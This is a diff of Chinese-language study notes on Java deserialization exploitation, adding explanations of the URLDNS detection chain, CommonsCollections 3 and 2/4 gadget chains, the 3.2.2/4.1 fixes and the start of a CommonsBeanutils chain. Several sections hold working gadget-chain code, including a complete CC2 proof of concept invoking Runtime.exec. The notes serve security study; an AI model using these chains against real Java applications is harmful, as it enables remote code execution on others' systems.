@@ -385,6 +385,8 @@
 
 ### 利用TemplatesImpl加载字节码
 
+> 注意，TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须 是 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet` 的子类。
+
 - 虽然大部分上层开发者不会直接使用到defineClass方法，但是Java底层还是有一些类用到了它（否则他也没存在的价值了对吧），这就是 `TemplatesImpl`(模板实现类) 。 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 这个类中定义了一个内部类 `TransletClassLoader` ：
 
     - ```java
@@ -480,7 +482,8 @@
     -  `_bytecodes 是由字节码组成的数组；`，也就是最后传入defneClass的字节码
     -  _name 可以是任意字符串，只要不为null即可； 
     - _tfactory 需要是一个 TransformerFactoryImpl 对象，因为 `TemplatesImpl#defineTransletClasses()` 方法里有调用到 `_tfactory.getExternalExtensionsMap()` ，如果是null会出错。 
-    - 另外，值得注意的是， TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须 是 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet` 的子类。
+
+- 另外，值得注意的是， **TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须 是 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet` 的子类。**
 
 - 所以，我们需要构造一个特殊的类：
 
@@ -609,7 +612,7 @@
               write(str.toCharArray(), off, len);
             }
           }
-        ```
+      ```
 
 - **基本可以理解为是传统字节码的HEX编码，再将反斜线替换成`$`。默认情况下外层还会加一层GZip压缩。**
 
@@ -1333,11 +1336,21 @@
 
 - 因为安全机制高版本（3.2.2版本及以上）`org.apache.commons.collections.functors.InvokerTransformer`类无法使用
 
-    - 在java代码中使用下列命令，可以在3.22版本启动该方法
+    - 在java代码中使用下列命令，可以在3.2.2版本启动该方法
 
         ````java
         System.setProperty("org.apache.commons.collections.enableUnsafeSerialization","true");
         ````
+    
+    - 先看3.2.2，通过diff可以发现，新版代码中增加了⼀个⽅法 FunctorUtils#checkUnsafeSerialization ，⽤于检测反序列化是否安全。如果开发者没有设置全 局配置`org.apache.commons.collections.enableUnsafeSerialization=true` ，即默认情况下会 抛出异常。
+    
+    -  这个检查在常⻅的危险Transformer类 （ InstantiateTransformer 、 InvokerTransformer 、 PrototypeFactory 、 CloneTransforme r 等）的 readObject ⾥进⾏调⽤，所以，当我们反序列化包含这些对象时就会抛出⼀个异常：
+    
+        - ```cmd
+             Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons. To enable it set system property 'org.apache.commons.collections.enableUnsafeSerialization' to 'true', but you must ensure that your application does not de-serialize objects from untrusted sources
+            ```
+    
+        - 以后如果看到这样的报错，就知道是什么原因了。
 
 #### 漏洞分析
 
@@ -2127,15 +2140,15 @@
 - 不同利用链依赖要求：
 
   ```txt
-  CommonsCollections1所需第三方库文件: commons-collections: 3.1
+  CommonsCollections1所需第三方库文件: commons-collections: 3.2.1
   
   CommonsCollections2所需第三方库文件: commons-collections4: 4.0
   
-  CommonsCollections3所需第三方库文件: commons-collections: 3.1(CommonsCollections1的变种)
+  CommonsCollections3所需第三方库文件: commons-collections: 3.2.1(CommonsCollections1的变种)
   
   CommonsCollections4所需第三方库文件: commons-collections4: 4.0(CommonsCollections2的变种)
   
-  CommonsCollections5,6,7,10用的还是commons-collections: 3.1， jdk用7或8都可以。
+  CommonsCollections5,6,7,10用的还是commons-collections: 3.2.1， jdk用7或8都可以。
   
   CommonsCollections9适用于3.2.1
   
@@ -2202,7 +2215,102 @@
 
 #### URLDNS—反序列化检测链
 
-#### cc6—高jdk版本可用
+- URLDNS 就是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不 是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。 虽然这个“利⽤链”实际上是不能“利⽤”的，但因为其如下的优点，⾮常适合我们在检测反序列化漏洞时 使⽤： 
+
+    - 使⽤Java内置的类构造，对第三⽅库没有依赖 
+    - 在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞 
+
+- 我们打开看看ysoserial的poc
+
+    - ```java
+        public Object getObject(final String url) throws Exception {
+        
+            //Avoid DNS resolution during payload creation
+            //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
+            URLStreamHandler handler = new SilentURLStreamHandler();
+        
+            HashMap ht = new HashMap(); // HashMap that will contain the URL
+            URL u = new URL(null, url, handler); // URL to use as the Key
+            ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
+        
+            Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
+        
+            return ht;
+        }
+        ```
+
+- 返回了一个HashMap对象，传入了一个键值对（URL，any），并设置了URL对象的hashCode的值为-1。那么，我们可以直奔 HashMap 类的 readObject ⽅法：
+
+    - 在最后的代码可以看到将 HashMap 的键名计算了hash
+
+        - ```java
+             putVal(hash(key), key, value, false, false);
+            ```
+
+    - 查看hash()
+
+        - ```java
+                static final int hash(Object key) {
+                    int h;
+                    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
+                }
+            ```
+
+    - 发现调用了key.hashCode()，也就是URL对象的hashCode()函数，继续查看。
+
+        - ```java
+                public synchronized int hashCode() {
+                    if (hashCode != -1)
+                        return hashCode;
+            
+                    hashCode = handler.hashCode(this);
+                    return hashCode;
+                }
+            ```
+
+    - 此时， handler 是 URLStreamHandler 对象（的某个⼦类对象），继续跟进其 hashCode ⽅法
+
+        - ```java
+                protected int hashCode(URL u) {
+                    int h = 0;
+            
+                    // Generate the protocol part.
+                    String protocol = u.getProtocol();
+                    if (protocol != null)
+                        h += protocol.hashCode();
+            
+                    // Generate the host part.
+                    InetAddress addr = getHostAddress(u);
+            ```
+
+    - 这⾥有调⽤ getHostAddress ⽅法，继续跟进：
+
+        - ```java
+                protected synchronized InetAddress getHostAddress(URL u) {
+                    if (u.hostAddress != null)
+                        return u.hostAddress;
+            
+                    String host = u.getHost();
+                    if (host == null || host.equals("")) {
+                        return null;
+                    } else {
+                        try {
+                            u.hostAddress = InetAddress.getByName(host);
+                        } catch (UnknownHostException ex) {
+                            return null;
+                        } catch (SecurityException se) {
+                            return null;
+                        }
+                    }
+                    return u.hostAddress;
+                }
+            ```
+
+        - 这⾥ InetAddress.getByName(host) 的作⽤是根据主机名，获取其IP地址，在⽹络上其实就是⼀次 DNS查询。
+
+- 到这⾥就不必要再跟了。 我们⽤⼀些第三⽅的反连平台就可以查看到这次请求，证明的确存在反序列化漏洞
+
+#### cc6_TiedMapEntry_lazymap—高jdk版本可用
 
 - jdk1.8.0_341复现成功
 
@@ -2512,7 +2620,726 @@
         
         ```
 
-    - 
+#### cc3—在sink处改进—InstantiateTransformer
+
+- 我们既然已经有CommonsCollections6这样通杀的利用链了，**为什么还需要一个 TemplatesImpl 的链呢?**
+
+    - 其实我们在学习PHP时，也曾遇到过一个场景，通过 call_user_func 造成 的代码执行，和通过 eval 造成的代码执行，哪一种更有价值？相信很多曾被assert、system等函数不 能使用困扰过的同学都会选择后者，这里也一样。 
+    - 通过 TemplatesImpl 构造的利用链，理论上可以执行任意Java代码，这是一种非常通用的代码执行漏 洞，不受到对于链的限制，特别是这几年**内存马**逐渐流行以后，**执行任意Java代码**的需求就更加浓烈了。
+
+- 上⼀篇⽂章我们认识了Java中加载字节码的⼀些⽅法，其中介绍了 TemplatesImpl 。 TemplatesImpl 是⼀个可以加载字节码的类，通过调⽤其 newTransformer() ⽅法，即可执⾏这段字节码的类构造器。 那么，我们是否可以在反序列化漏洞中，利⽤这个特性来执⾏任意java代码呢？
+
+- 我们先回忆⼀下CommonsCollections1
+
+    - ```java
+        Transformer[] transformers = new Transformer[] {
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
+            new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
+            new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})};
+        
+        Transformer transformedChain = new ChainedTransformer(transformers);  //实例化一个反射链
+        
+        Map innerMap = new HashMap();   //实例化一个Map对象
+        innerMap.put("value", "value");
+        
+        Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain); //将Map对象和反射链作为参数传入
+        
+        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  //得到 AnnotationInvocationHandler类的字节码文件
+        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
+        ctor.setAccessible(true);
+        Object instance = ctor.newInstance(Target.class, outerMap);  //得到我们构造好的 AnnotationInvocationHandler类实例
+        ```
+
+- ⽽我们⼜学习了如何利⽤ TemplatesImpl 执⾏字节码：
+
+    - ```java
+        public static void main(String[] args) throws Exception {
+        
+                byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAKAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAADAALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA4ABAAPAAwAEAABABAAAAACABE=");
+                TemplatesImpl obj = new TemplatesImpl();
+                setFieldValue(obj, "_bytecodes", new byte[][] {code});
+                setFieldValue(obj, "_name", "HelloTemplatesImpl");
+                setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
+                obj.newTransformer();
+        
+        }
+        ```
+
+- 我们只需要结合这两段POC，即可很容易地改造出⼀个执⾏任意字节码的CommonsCollections利⽤ 链：只需要将第⼀个demo中InvokerTransformer执⾏的“⽅法”改 成 TemplatesImpl::newTransformer() ，即为
+
+    - ```java
+        Transformer[] transformers = new Transformer[]{
+         new ConstantTransformer(obj),
+         new InvokerTransformer("newTransformer", null, null)
+        };
+        ```
+
+- 不过，此时查看ysoserial的代码，会发现CommonsCollections3和上面，准确来说，是 没有使用到`InvokerTransformer`
+
+- 原因是什么呢？
+
+    - 2015年初，@frohoff和@gebl发布了Talk《Marshalling Pickles: how deserializing objects will ruin your day》，以及Java反序列化利⽤⼯具ysoserial，随后引爆了安全界。开发者们⾃然会去找寻⼀种安 全的过滤⽅法，于是类似[SerialKiller](https://github.com/ikkisoft/SerialKiller)这样的⼯具随之诞⽣。
+    -  SerialKiller是⼀个Java反序列化过滤器，可以通过⿊名单与⽩名单的⽅式来限制反序列化时允许通过的 类。在其发布的第⼀个版本代码中，我们可以看到其给出了最初的⿊名单
+
+- 这个⿊名单中InvokerTransformer赫然在列，也就切断了CommonsCollections1的利⽤链。有攻就有 防，
+
+- ysoserial随后增加了不少新的Gadgets，其中就包括CommonsCollections3。 CommonsCollections3的⽬的很明显，**就是为了绕过⼀些规则对InvokerTransformer的限制**。
+
+-  CommonsCollections3并没有使⽤到InvokerTransformer来调⽤任意⽅法，⽽是⽤到了另⼀个 类， `com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter` 。 这个类的构造⽅法中调⽤了 `(TransformerImpl) templates.newTransformer()` ，免去了我们使⽤ InvokerTransformer⼿⼯调⽤ newTransformer() ⽅法这⼀步
+
+    - ```java
+            public TrAXFilter(Templates templates)  throws
+                TransformerConfigurationException
+            {
+                _templates = templates;
+                _transformer = (TransformerImpl) templates.newTransformer();
+                _transformerHandler = new TransformerHandlerImpl(_transformer);
+                _useServicesMechanism = _transformer.useServicesMechnism();
+            }
+        ```
+
+- 当然，缺少了InvokerTransformer，TrAXFilter的构造⽅法也是⽆法调⽤的。这⾥会⽤到⼀个新的 Transformer，就是 `org.apache.commons.collections.functors.InstantiateTransformer` 。 InstantiateTransformer也是⼀个实现了Transformer接⼝的类，**他的作⽤就是调⽤构造⽅法**。
+
+- 所以，我们实现的⽬标就是，利⽤ `InstantiateTransformer` 来调⽤到 TrAXFilter 的构造⽅法，再利 ⽤其构造⽅法⾥的 `templates.newTransformer()` 调⽤到 `TemplatesImpl` ⾥的字节码。
+
+- 我们构造的Transformer调⽤链如下：
+
+    - ```java
+        Transformer[] transformers = new Transformer[]{
+             new ConstantTransformer(TrAXFilter.class),
+             new InstantiateTransformer(
+             new Class[] { Templates.class },
+             new Object[] { obj })
+         };
+        ```
+
+- 替换到前⾯的demo中，也能成功触发，避免了使⽤InvokerTransformer：
+
+- ysoserial的cc3使用的是AnnotationInvocationHandler+LazyMap的组合，所以也有CommonsCollections1⼀样的问题，就是只⽀持Java 8u71及以下版本。
+
+**总结**：
+
+- **我们可以用cc6的方法来改造cc3，使其支持高版本jdk。**
+
+#### commons-collections4.0版本—cc2，cc4
+
+- **在4.0中3.0的链子同样可以用，还有新的链子出来。**
+
+- Apache Commons Collections是⼀个著名的辅助开发库，包含了⼀些Java中没有的数据结构和和辅助 ⽅法，不过随着Java 9以后的版本中原⽣库功能的丰富，以及反序列化漏洞的影响，它也在逐渐被升级或替代。 
+- 在2015年底commons-collections反序列化利⽤链被提出时，Apache Commons Collections有以下两 个分⽀版本： 
+    - `commons-collections:commons-collections` 
+    - `org.apache.commons:commons-collections4` 
+- 可⻅，groupId和artifactId都变了。前者是Commons Collections⽼的版本包，当时版本号是3.2.1；后 者是官⽅在2013年推出的4版本，当时版本号是4.0。
+- 那么为什么会分成两个不同的分⽀呢？
+    -  官⽅认为旧的commons-collections有⼀些架构和API设计上的问题，但修复这些问题，会产⽣⼤量不能 向前兼容的改动。
+    - 所以，**commons-collections4不再认为是⼀个⽤来替换commons-collections的新版本，⽽是⼀个新的包**，两者的命名空间不冲突，因此可以共存在同⼀个项⽬中。
+- 那么很自然有个问题，**既然3.2.1中存在反序列化利⽤链，那么4.0版本是否存在呢？**
+
+**commons-collections4的改动**
+
+- 为了探索这个问题，我们需要先搞清楚⼀点，⽼的利⽤链在commons-collections4中是否仍然能使⽤？ 幸运的是，因为这⼆者可以共存，所以我可以将两个包安装到同⼀个项⽬中进⾏⽐较
+
+    - ```xml
+        <dependency>
+            <groupId>commons-collections</groupId>
+            <artifactId>commons-collections</artifactId>
+            <version>3.2.1</version>
+        </dependency>
+        <dependency>
+            <groupId>org.apache.commons</groupId>
+            <artifactId>commons-collections4</artifactId>
+            <version>4.0</version>
+        </dependency>
+        
+        ```
+
+- 然后，因为⽼的Gadget中依赖的包名都是 `org.apache.commons.collections` ，⽽新的包名已经变 了，是 `org.apache.commons.collections4` 。 我们⽤已经熟悉的CommonsCollections6利⽤链做个例⼦，我们直接把代码拷⻉⼀遍，然后将所 有 `import org.apache.commons.collections.*` 改成 `import org.apache.commons.collections4.*` 
+
+- 此时IDE爆出了⼀个错误，原因是 LazyMap.decorate 这个⽅法没了：
+
+    - 我们看下3中decorate的定义，⾮常简单：
+
+        - ```java
+            public static Map decorate(Map map, Transformer factory) {
+             return new LazyMap(map, factory);
+            }
+            ```
+
+        - 这个方法不过就是LazyMap构造函数的⼀个包装，
+
+    - ⽽在4中这个方法其实只是改了个名字叫 lazyMap ：
+
+        - ```java
+            public static <V, K> LazyMap<K, V> lazyMap(final Map<K, V> map, final
+            Transformer<? super K, ? extends V> factory) {
+             return new LazyMap<K,V>(map, factory);
+            }
+            ```
+
+    - 所以，我们将Gadget中出错的代码换⼀下名字：
+
+        - ```java
+            Map outerMap = LazyMap.lazyMap(innerMap, transformerChain);
+            ```
+
+- **解决了错误，我们运⾏⼀下，成功弹出计算器：**
+
+- **同理，可以试⼀下之前看过的CommonsCollections1、CommonsCollections3，都可以在commonscollections4中正常使用。**
+
+- 除了⽼的⼏个利⽤链，ysoserial还为commons-collections4准备了两条新的利⽤链，那就是 CommonsCollections2和CommonsCollections4。
+
+-  **commons-collections这个包之所有能攒出那么多利⽤链来，除了因为其使⽤量⼤，技术上的原因是其 中包含了⼀些可以执行任意方法的Transformer**。所以，在commons-collections中找Gadget的过 程，实际上可以简化为，找⼀条从 `Serializable#readObject()` ⽅法到 `Transformer#transform()` ⽅法的调⽤链。
+
+#### cc2—PriorityQueue—TransformingComparator
+
+- 有了这个认识，我们再来看CommonsCollections2，其中⽤到的两个关键类是：
+
+    - source: `java.util.PriorityQueue` 
+    - Gadge: `org.apache.commons.collections4.comparators.TransformingComparator` 
+
+- 这两个类有什么特点？ 
+
+    - java.util.PriorityQueue 是⼀个有自己 readObject() ⽅法的类：
+
+        - ```java
+                /**
+                 * Reconstitutes the {@code PriorityQueue} instance from a stream
+                 * (that is, deserializes it).
+                 *
+                 * @param s the stream
+                 */
+                private void readObject(java.io.ObjectInputStream s)
+                    throws java.io.IOException, ClassNotFoundException {
+                    // Read in size, and any hidden stuff
+                    s.defaultReadObject();
+            
+                    // Read in (and discard) array length
+                    s.readInt();
+            
+                    queue = new Object[size];
+            
+                    // Read in all elements.
+                    for (int i = 0; i < size; i++)
+                        queue[i] = s.readObject();
+            
+                    // Elements are guaranteed to be in "proper order", but the
+                    // spec has never explained what that might be.
+                    heapify();
+                }
+            
+            ```
+
+    - `org.apache.commons.collections4.comparators.TransformingComparator` 中有调 ⽤ transform() ⽅法的函数
+
+        - ```java
+                public int compare(I obj1, I obj2) {
+                    O value1 = this.transformer.transform(obj1);
+                    O value2 = this.transformer.transform(obj2);
+                    return this.decorated.compare(value1, value2);
+                }
+            ```
+
+        - 这里比较的两个对象都经过了transfom函数，所以rce会执行两次
+
+    - 所以，CommonsCollections2实际就是⼀条从 PriorityQueue 到 TransformingComparator 的利⽤ 链。 看⼀下他们是怎么连接起来的。 PriorityQueue#readObject() 中调⽤了 `heapify()` ⽅ 法， heapify() 中调⽤了 `siftDown()` ， siftDown() 中调⽤了 siftDownUsingComparator() ， siftDownUsingComparator() 中调⽤的 `comparator.compare()` ，于是就连接到上⾯的 TransformingComparator 了：
+
+    - 整个调⽤关系⽐较简单，调试时间不会超过5分钟。 
+
+    - 总结⼀下：
+
+        - java.util.PriorityQueue 是⼀个优先队列（Queue），基于⼆叉堆实现，队列中每⼀个元素有 ⾃⼰的优先级，节点之间按照优先级⼤⼩排序成⼀棵树 
+        - 反序列化时为什么需要调⽤ heapify() 方法？为了反序列化后，需要恢复（换⾔之，保证）这个结构的顺序 ，会进行重排序的操作，而排序就涉 及到大小比较。
+        - 排序是靠将⼤的元素下移实现的。 siftDown() 是将节点下移的函数， ⽽ comparator.compare() ⽤来⽐较两个元素大小。
+        - TransformingComparator 实现了 java.util.Comparator 接⼝，这个接⼝⽤于定义两个对象如 何进⾏⽐较。 siftDownUsingComparator() 中就使⽤这个接⼝的 compare() ⽅法⽐较树的节 点。 
+
+    - 关于 PriorityQueue 这个数据结构的具体原理，可以参考这篇⽂章：https://www.cnblogs.com/lingh u-java/p/9467805.html 按照这个思路开始编写POC吧。 
+
+- ⾸先，还是创建Transformer，标准操作：
+
+    - ```java
+        Transformer[] transformers = new Transformer[] {
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
+            new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
+            new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
+        };
+        //创建一个fake利用链，最后的时候把这个利用链换成上面的
+        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
+        Transformer transformedChain = new ChainedTransformer(fakeTransformers);  //实例化一个反射链
+        
+        ```
+
+- 再创建⼀个 TransformingComparator ，传⼊我们的Transformer：
+
+    - ```java
+        Comparator comparator = new TransformingComparator(transformedChain);
+        ```
+
+- 实例化 PriorityQueue 对象，第⼀个参数是初始化时的⼤⼩，⾄少需要2个元素才会触发排序和⽐较， 所以是2；第⼆个参数是⽐较时的Comparator，传⼊前⾯实例化的comparator
+
+    - ```java
+        PriorityQueue queue = new PriorityQueue(2, comparator);
+        queue.add(1);
+        queue.add(2);
+        ```
+
+- 后⾯随便添加了2个数字进去，这⾥可以传⼊⾮null的任意对象，因为我们的Transformer是忽略传⼊参 数的。 最后，将真正的恶意Transformer设置上，原因不⽤多说：
+
+    - ```java
+        setFieldValue(transformerChain, "iTransformers", transformers)
+        ```
+
+- 完整的poc
+
+    - ```
+        package cc;
+        
+        import org.apache.commons.collections4.Transformer;
+        import org.apache.commons.collections4.comparators.TransformingComparator;
+        import org.apache.commons.collections4.functors.ChainedTransformer;
+        import org.apache.commons.collections4.functors.ConstantTransformer;
+        import org.apache.commons.collections4.functors.InvokerTransformer;
+        
+        import java.io.*;
+        import java.lang.reflect.Field;
+        import java.util.Comparator;
+        import java.util.PriorityQueue;
+        
+        public class CC2 {
+            public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException {
+                Transformer[] transformers = new Transformer[] {
+                        new ConstantTransformer(Runtime.class),
+                        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
+                        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
+                        new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
+                };
+                //创建一个fake利用链，最后的时候把这个利用链换成上面的
+                Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
+                Transformer transformedChain = new ChainedTransformer(fakeTransformers);  //实例化一个反射链
+        
+                //再创建⼀个 TransformingComparator ，传⼊我们的Transformer：
+                Comparator comparator = new TransformingComparator(transformedChain);
+        
+                PriorityQueue queue = new PriorityQueue(2, comparator);
+                queue.add(1);
+                queue.add(2);
+        
+                // 将真正的transformers数组设置进来
+                Field fd = org.apache.commons.collections4.functors.ChainedTransformer.class.getDeclaredField("iTransformers");
+                fd.setAccessible(true);
+                fd.set(transformedChain, transformers);
+        
+                FileOutputStream f = new FileOutputStream("./test.txt");
+                ObjectOutputStream out = new ObjectOutputStream(f);  //创建一个对象输出流
+                out.writeObject(queue);  //将我们构造的 AnnotationInvocationHandler类进行序列化
+                out.flush();
+                out.close();
+                //开始反序列化test.txt文件
+                Unser();
+            }
+        
+            public static void Unser() throws IOException,ClassNotFoundException{
+                FileInputStream in = new FileInputStream("./test.txt");   //实例化一个文件输入流
+                ObjectInputStream ins = new ObjectInputStream(in);      //实例化一个对象输入流
+                CC6.User u= (CC6.User) ins.readObject();   //反序列化
+                System.out.println("反序列化成功！");
+                ins.close();
+            }
+            class User {
+            }
+        }
+        
+        
+        ```
+
+    - 弹了两次计算器。
+
+- **PriorityQueue的利⽤链是否⽀持在commons-collections 3中使⽤？**
+
+    - 不能。因为这条利⽤链中的关键 ，类`org.apache.commons.collections4.comparators.TransformingComparator` ，在commonscollections4.0以前是版本中是没有实现 Serializable 接⼝的，⽆法在序列化中使⽤。
+
+#### cc反序列化官方修复方法
+
+- Apache Commons Collections官⽅在2015年底得知序列化相关的问题后，就在两个分⽀ 上同时发布了新的版本，4.1和3.2.2。 
+
+- 先看3.2.2，
+
+    - 通过[diff](https://github.com/apache/commons-collections/compare/collections-3.2.1...collections-3.2.2%23diff-560c8d37c3de3c3843f9a09ffac4e1be3e4e97ad48d3da02d767087860bb4f8d)可以发现，新版代码中增加了⼀个⽅法 FunctorUtils#checkUnsafeSerialization ，⽤于检测反序列化是否安全。如果开发者没有设置全 局配置 `org.apache.commons.collections.enableUnsafeSerialization=true` ，即默认情况下会 抛出异常。 
+
+        - ```
+            Serialization support for org.apache.commons.collections.functors.InvokerTransformer is
+            disabled for security reasons. To enable it set system property
+            'org.apache.commons.collections.enableUnsafeSerialization' to 'true', but you must ensure
+            that your application does not de-serialize objects from untrusted source
+            ```
+
+    - 这个检查在常⻅的危险Transformer类 （ InstantiateTransformer 、 InvokerTransformer 、 PrototypeFactory 、 CloneTransformer 等）的 readObject ⾥进⾏调⽤，所以，当我们反序列化包含这些对象时就会抛出⼀个异常。
+
+- 再看4.1，修复⽅式⼜不⼀样。
+
+    - 4.1⾥，这⼏个危险Transformer类不再实现 Serializable 接⼝，也就 是说，他们⼏个彻底⽆法序列化和反序列化了。更绝
+
+- **我们是否还能找到其他可以利用的 java.util.Comparator 对象呢？**
+
+#### Apache Commons Beanutils —非cc链
+
+> 与cc2的区别是sink并没用cc链，而是用了cb链
+
+commons-beanutils依赖于commons-collections
+
+**了解Apache Commons Beanutils**
+
+- Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对 象（也称为JavaBean）的一些操作方法。 
+
+- 关于JavaBean的说明可以参考[这篇文章](https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680)。比如，Cat是一个最简单的JavaBean类：
+
+    -   ```java
+          final public class Cat {
+              private String name = "catalina";
+              public String getName() {
+              	return name;
+              }
+              public void setName(String name) {
+                  this.name = name;
+              }
+          }
+          ```
+
+- 它包含一个私有属性name，和读取和设置这个属性的两个方法，又称为getter和setter。其中，getter 的方法名以get开头，setter的方法名以set开头，全名符合骆驼式命名法（Camel-Case）。
+
+-  commons-beanutils中提供了一个静态方法 `PropertyUtils.getProperty` ，让使用者可以直接调用任 意JavaBean的getter方法，比如：
+
+    - ```java
+        PropertyUtils.getProperty(new Cat(), "name");
+        ```
+
+- 此时，commons-beanutils会自动找到name属性的getter方法，也就是 getName ，然后调用，获得返 回值。除此之外， PropertyUtils.getProperty 还支持递归获取属性，比如a对象中有属性b，b对象 中有属性c，我们可以通过 PropertyUtils.getProperty(a, "b.c"); 的方式进行递归获取。通过这个 方法，使用者可以很方便地调用任意对象的getter，适用于在不确定JavaBean是哪个类对象时使用。 
+
+- 当然，commons-beanutils中诸如此类的辅助方法还有很多，如调用setter、拷贝属性等，本文不再细 说。
+
+**getter的妙用**
+
+- 回到本文主题，我们需要找可以利用的 java.util.Comparator 对象，在commons-beanutils包中就存 在一个： `org.apache.commons.beanutils.BeanComparator` 。
+
+- BeanComparator 是commons-beanutils提供的用来比较两个JavaBean是否相等的类，其实现了 java.util.Comparator 接口。我们看它的compare方法：
+
+    - ```java
+        public int compare( final T o1, final T o2 ) {
+            if ( property == null ) {
+                // compare the actual objects
+                return internalCompare( o1, o2 );
+            }
+            try {
+                final Object value1 = PropertyUtils.getProperty( o1, property );
+                final Object value2 = PropertyUtils.getProperty( o2, property );
+                return internalCompare( value1, value2 );
+            }
+            catch ( final IllegalAccessException iae ) {
+                throw new RuntimeException( "IllegalAccessException: " +
+                iae.toString() );
+            }
+            catch ( final InvocationTargetException ite ) {
+                throw new RuntimeException( "InvocationTargetException: " +
+                ite.toString() );
+            }
+            catch ( final NoSuchMethodException nsme ) {
+                throw new RuntimeException( "NoSuchMethodException: " +
+                nsme.toString() );
+            }
+        }
+        
+        ```
+
+- 这个方法传入两个对象，如果 this.property 为空，则直接比较这两个对象；如果 this.property 不 为空，则用 PropertyUtils.getProperty 分别取这两个对象的 this.property 属性，比较属性的值。 上一节我们说了， PropertyUtils.getProperty 这个方法会自动去调用一个JavaBean的getter方法， 这个点是任意代码执行的关键。有没有什么getter方法可以执行恶意代码呢？
+
+-  此时回到《Java安全漫谈》第13章，其中在追踪分析 TemplatesImpl 时，有过这么一段描述：
+
+    - ```java'
+        我们从 TransletClassLoader#defineClass() 向前追溯一下调用链：
+        TemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() ->
+        TemplatesImpl#getTransletInstance() ->
+        TemplatesImpl#defineTransletClasses() ->
+        TransletClassLoader#defineClass()
+        ```
+
+- 看到这个 `TemplatesImpl#getOutputProperties()` 了吗？这个 getOutputProperties() 方法是调用 链上的一环，它的内部调用了 `TemplatesImpl#newTransformer()` ，也就是我们后面常用来执行恶意 字节码的方法：
+
+    - ```java
+        public synchronized Properties getOutputProperties() {
+            try {
+            	return newTransformer().getOutputProperties();
+            }
+            catch (TransformerConfigurationException e) {
+            	return null;
+            }
+        }
+        ```
+
